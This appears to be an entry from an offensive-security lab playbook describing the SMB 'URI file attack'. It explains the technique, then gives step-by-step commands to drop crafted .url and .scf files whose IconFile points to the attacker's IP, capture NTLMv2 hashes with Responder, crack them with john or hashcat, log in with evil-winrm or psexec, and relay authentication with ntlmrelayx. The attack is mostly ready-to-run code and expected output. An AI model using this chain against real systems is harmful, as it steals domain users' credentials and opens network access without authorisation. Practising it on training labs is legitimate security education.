title: SMB Writable Share — URI File Attack to Capture NTLMv2 Hashes
body:
You found a writable SMB share on a Windows target. This is one of the highest-value findings in AD recon because it lets you coerce authentication from any user who browses that share — without them clicking anything, without phishing, without social engineering.

The trick: Windows Explorer pre-resolves file icons the moment a user navigates into a folder. By dropping a specially crafted file (.url / .lnk / .scf / .library-ms) that points its IconFile to your Kali IP, you force Windows to attempt SMB authentication to your machine the second the folder is browsed. Responder catches the resulting NTLMv2 hash, and john + rockyou cracks it most of the time on lab boxes.

This is the OffSec-named 'URI file attack' — canonical example seen on PG Practice's Vault box and many OSCP-style AD targets.

— THE CORE IDEA —

Windows treats certain file types as 'shell items' that get pre-rendered when their parent folder is browsed:
  - .url           Internet Shortcut (most common, simplest)
  - .lnk           Windows shortcut (broader Windows compatibility)
  - .scf           Windows Explorer command (older but still works)
  - .library-ms    Windows Library definition (Windows 7+)

Each of these can specify an icon path. If that icon path is a UNC path (\\YOUR_IP\anything), Windows tries to authenticate to your SMB server to fetch the icon. That authentication leaks the NTLMv2 hash of whichever user account caused Explorer to render the folder.

Who triggers it:
  - Any logged-in user who browses the share (manual)
  - Backup jobs that index/scan the share (service accounts)
  - Antivirus scanners walking the filesystem
  - Search indexers (cron-driven on lab boxes)
  - Sometimes nobody — patient OSCP boxes can take 5-15 min

— FILE VARIANT TRADE-OFFS —

  .url  ─ Simplest, most reliable. Three lines. Use this first.
          Pre-resolves on folder browse. No click required.
          Used by official PG Vault walkthrough.

  .lnk  ─ Native Windows shortcut. Slightly more complex (binary or
          PowerShell-generated). More reliable on locked-down systems
          where .url might be filtered. Use ntlm_theft.py to generate.

  .scf  ─ Older 'shell command file' format. Pre-resolves on Vista/7/8.
          Less reliable on Server 2016+ but still works on many lab boxes.

  .library-ms ─ Windows Library file. Triggers on view, not just hover.
                Useful when share has thumbnail view enabled.

If .url doesn't fire after 10-15 min, drop a .lnk too. Belt-and-suspenders.

— THE FILENAME TRICK —

Name the file with a leading character that makes it sort FIRST in directory
listings. Common picks:
  - @hax.url    (@ sorts before letters)
  - !pwn.url    (! sorts even earlier)
  - aaa.url     (alphabetical first)
  - ~.url       (tilde sorts at end of ASCII letters but visible)

Why: maximizes chance Explorer renders YOUR icon first when the folder is
browsed. The official OffSec walkthrough uses @hax.url — that's the canonical
name.
cmd:
# ── STEP 0: CONFIRM SHARE IS WRITABLE ────────────────
# (Should already be done from smb_enum — verify if uncertain)
smbclient -N //$ip/DocumentsShare
# smb: \> put /etc/hostname test.txt
# smb: \> ls   (test.txt should appear)
# smb: \> rm test.txt
# smb: \> quit
#
# Or with credentials if anonymous fails:
smbclient -U 'user%pass' //$ip/SHARE
#
# Confirm via smbmap (clearer READ/WRITE indication):
smbmap -H $ip -u guest
# Look for 'READ, WRITE' in the Permissions column

# ── STEP 1: PICK YOUR KALI IP (the listener) ─────────
ip a show tun0 | grep 'inet '
# Note this IP — call it $LHOST below. Common values:
#   tun0 = 192.168.45.x   (PG/HTB OpenVPN)
#   eth0 = 192.168.111.x  (PG internal)
export LHOST=192.168.45.123   # ← REPLACE with your actual tun0 IP

# ── STEP 2A: BUILD .url FILE (RECOMMENDED FIRST CHOICE) ─
# Three lines. That's it. Done in one heredoc:
cat > @hax.url <<EOF
[InternetShortcut]
URL=anything
WorkingDirectory=anything
IconFile=\\\\${LHOST}\\%USERNAME%.icon
IconIndex=1
EOF

# Verify the contents look right:
cat @hax.url
# Expected:
#   [InternetShortcut]
#   URL=anything
#   WorkingDirectory=anything
#   IconFile=\\192.168.45.123\%USERNAME%.icon
#   IconIndex=1
# The %USERNAME% is a Windows env var — it expands at render time to
# whoever's account browsed the folder. That's why your Responder log
# shows the username automatically.

# ── STEP 2B: BUILD .lnk FILE (BACKUP / BROADER COMPAT) ─
# Use ntlm_theft (multi-format generator from greenwolf/ntlm_theft):
locate ntlm_theft.py     # Should be at /usr/share/ntlm-theft/ on Kali
# If not installed: git clone https://github.com/Greenwolf/ntlm_theft.git

python3 /usr/share/ntlm-theft/ntlm_theft.py \
    -g lnk \
    -s $LHOST \
    -f hax
# Output: hax/hax.lnk
# This generator also creates .url, .scf, .library-ms, .pdf, .docx etc.
# To generate ALL variants at once: -g all

python3 /usr/share/ntlm-theft/ntlm_theft.py -g all -s $LHOST -f payload
# Output: payload/ folder with every variant
# Then upload several to maximize trigger chance

# ── STEP 2C: BUILD .scf FILE (LEGACY FALLBACK) ────────
cat > @hax.scf <<EOF
[Shell]
Command=2
IconFile=\\\\${LHOST}\\share\\file.ico
[Taskbar]
Command=ToggleDesktop
EOF

# ── STEP 3: START RESPONDER BEFORE UPLOADING ─────────
# CRITICAL: Responder must be listening BEFORE the file lands in the share.
# Some lab boxes index immediately on file write — you'll miss the hash if
# you upload first and start Responder second.

# Edit /etc/responder/Responder.conf — make sure SMB and HTTP are 'On':
sudo grep -E '^SMB|^HTTP' /etc/responder/Responder.conf
# Should show: SMB = On / HTTP = On

# Start Responder on the VPN interface (tun0 for PG/HTB):
sudo responder -I tun0 -wrf -v
# -I tun0   listen on the VPN tap interface
# -w        WPAD rogue server (extra catch for HTTP-based authentication)
# -r        enable answers for NetBIOS wredir suffix queries
# -f        fingerprint the host on first authentication
# -v        verbose output (you want to see SMB/NTLM events)
#
# Leave this running in its own terminal. Don't ctrl-C.

# ── STEP 4: UPLOAD URI FILE TO THE SHARE ─────────────
# In a NEW terminal (Responder keeps running):

# Anonymous write:
smbclient -N //$ip/DocumentsShare -c "put @hax.url"

# With credentials:
smbclient -U 'domain/user%password' //$ip/SHARE -c "put @hax.url"

# Upload multiple variants to maximize trigger chance:
smbclient -N //$ip/DocumentsShare <<EOF
put @hax.url
put @hax.lnk
put @hax.scf
ls
quit
EOF

# ── STEP 5: VERIFY UPLOAD LANDED ──────────────────────
smbclient -N //$ip/DocumentsShare -c 'ls'
# Should see your file(s) in the listing

# ── STEP 6: WAIT FOR HASH CAPTURE ─────────────────────
# Watch the Responder window. You'll see something like:
#
#   [SMB] NTLMv2-SSP Client   : 192.168.x.x
#   [SMB] NTLMv2-SSP Username : VAULT\anirudh
#   [SMB] NTLMv2-SSP Hash     : anirudh::VAULT:9def1316e1c05550:0AF...
#
# Wait 5-15 min on lab boxes. If nothing after 20 min:
#   1. Check share permissions actually allow READ for the user (not just WRITE)
#   2. Try .lnk variant in addition to .url
#   3. Confirm Responder is on the right interface (sudo netstat -tlnp | grep :445)
#   4. Confirm no firewall blocking inbound SMB (sudo ufw status / sudo iptables -L)
#
# Hashes also auto-save to:
#   /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt

# ── STEP 7: CAPTURE AND CRACK ─────────────────────────
# Copy the hash exactly as Responder logged it (one line, full string):
echo 'anirudh::VAULT:9def1316e1c05550:0AF01C475...' > hash.txt

# Or pull from Responder log directory:
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.45.201.txt > hash.txt

# Crack with john (NTLMv2 format auto-detected):
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Or hashcat (mode 5600 = NetNTLMv2):
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Show cracked passwords:
john --show hash.txt
hashcat -m 5600 hash.txt --show

# ── STEP 8: USE THE CREDENTIAL ────────────────────────
# Lab boxes: cracked password works for evil-winrm, smb auth, etc.
evil-winrm -i $ip -u anirudh -p 'SecureHM'

# If the hash doesn't crack — try pass-the-hash with the NT portion:
# (Only works if you also captured an NTLMv1 or have the NT hash from another source)
impacket-psexec -hashes :NTHASH domain/user@$ip

# Always BloodHound the moment you get a domain credential:
bloodhound-python -d domain.local -u anirudh -p 'SecureHM' -ns $ip -c All

# ── ALTERNATIVE: NTLM RELAY INSTEAD OF CRACKING ───────
# If SMB signing is NOT required on another target, relay the auth
# instead of cracking it.
# Check signing status first:
nxc smb $ip --gen-relay-list relay_targets.txt
# Or per-host:
nxc smb $range  # look for 'signing:False' in output

# Run impacket-ntlmrelayx alongside Responder:
impacket-ntlmrelayx -tf relay_targets.txt -smb2support
# In Responder.conf, set: SMB = Off / HTTP = Off
# Otherwise Responder eats the auth before relay can use it.
#
# Then upload your URI file as in step 4. Captured auth gets relayed,
# not cracked — gives you a SOCKS proxy or shell on relayed target.
warn:
RESPONDER MUST BE RUNNING BEFORE THE FILE LANDS:
  Some lab boxes index/scan share contents immediately on file write
  (antivirus, search indexer, custom cron jobs). If you upload first and
  start Responder second, you've missed your shot. The user/service
  account will have already attempted authentication to your offline
  Kali machine and given up. You'd need to wait for next browse cycle.
  Always: start Responder → THEN upload.

CHECK SMB CONF FILE BEFORE STARTING RESPONDER:
  /etc/responder/Responder.conf must have SMB=On and HTTP=On for default
  capture mode. If you're doing NTLM relay (ntlmrelayx), set SMB=Off and
  HTTP=Off so Responder doesn't eat the auth before the relay tool sees
  it. These two modes are mutually exclusive.

INTERFACE SELECTION MATTERS:
  PG/HTB usually use tun0 (OpenVPN). Some labs use tap0 or a different
  name — check with 'ip a' and pick the one with the VPN-assigned IP.
  Wrong interface = Responder listens on Kali's local LAN, never sees
  the lab traffic. Symptom: nothing ever shows up in Responder log.

%USERNAME% EXPANSION HAPPENS ON THE TARGET, NOT ON KALI:
  In your @hax.url, %USERNAME% is a Windows environment variable.
  When the target's Explorer tries to fetch the icon, it expands
  %USERNAME% to whoever is currently logged in on the target machine.
  That's why Responder logs username automatically — it's encoded in
  the requested filename. Don't expand %USERNAME% on Kali (that would
  resolve to 'kali').

ESCAPING BACKSLASHES IN BASH HEREDOCS:
  In a bash heredoc, backslashes need doubling for literal output.
  Each \\ in the source = one \ in the file. So:
    IconFile=\\\\${LHOST}\\%USERNAME%.icon
  in heredoc produces:
    IconFile=\\192.168.45.123\%USERNAME%.icon
  in the file. ALWAYS cat the file after writing to confirm UNC path
  has exactly two leading backslashes (\\) and proper formatting.

LAB BOXES MAY HAVE LIMITED PATIENCE:
  Some PG/OSCP boxes have scheduled tasks that browse the share every
  5 min. Others rely on a manual check by an automated user account.
  If 30+ min pass with nothing in Responder, troubleshoot:
    1. Confirm file is still in share: smbclient -N //$ip/SHARE -c 'ls'
    2. Confirm Responder is actually listening: sudo ss -tlnp | grep :445
    3. Try a different file format (.lnk if you used .url)
    4. Re-upload — some boxes only fire on file CREATE event, not on
       existing file presence

RESPONDER VS SMB SHARE CONFLICT:
  If you have an SMB server running on Kali (e.g., impacket-smbserver
  for file transfer), it conflicts with Responder on port 445. Stop
  one before starting the other:
    sudo ss -tlnp | grep :445   # see what's bound
    sudo systemctl stop smbd    # stop system Samba if running
    pkill -f smbserver.py       # stop impacket smbserver if running

NOT EVERY HASH CRACKS:
  Lab boxes usually have rockyou-tier passwords. Real engagements
  don't. If rockyou + best64 rules don't crack in 10 min:
    - Try rockyou + d3ad0ne or OneRuleToRuleThemAll rules
    - Try crackstation.txt or other large wordlists
    - Try NTLM relay (skip cracking entirely — see step 8 alternative)
  But on OSCP/PG: if it doesn't crack with rockyou, it's probably not
  the path. Pivot to other shares, AS-REP roasting, or kerberoasting.

NTLMv1 vs NTLMv2:
  Modern Windows (Server 2008+) uses NTLMv2 by default — what you're
  capturing here. NTLMv1 is older and weaker (crackable with rainbow
  tables in seconds via crack.sh). If Responder logs an NTLMv1 hash,
  that's a configuration issue on the target — but lucky for you.
  Submit to https://crack.sh for fast cracking.

FILES PERSIST — CLEAN UP FOR REPORTS:
  After successful exploitation, document the file you dropped and
  remove it. On real engagements, leaving @hax.url in a corporate
  share is sloppy.
    smbclient -N //$ip/SHARE -c 'rm @hax.url'
  Note in your report: 'Dropped @hax.url at \\$ip\SHARE\@hax.url at
  TIMESTAMP, removed at TIMESTAMP after exploitation.'

choices.label: Got NTLMv2 hash — crack it with john/hashcat
Cracked password — log in via WinRM
SMB signing off elsewhere — relay instead of cracking
Hash won't crack — try AS-REP roast or kerberoast
Nothing in Responder after 30 min — troubleshoot
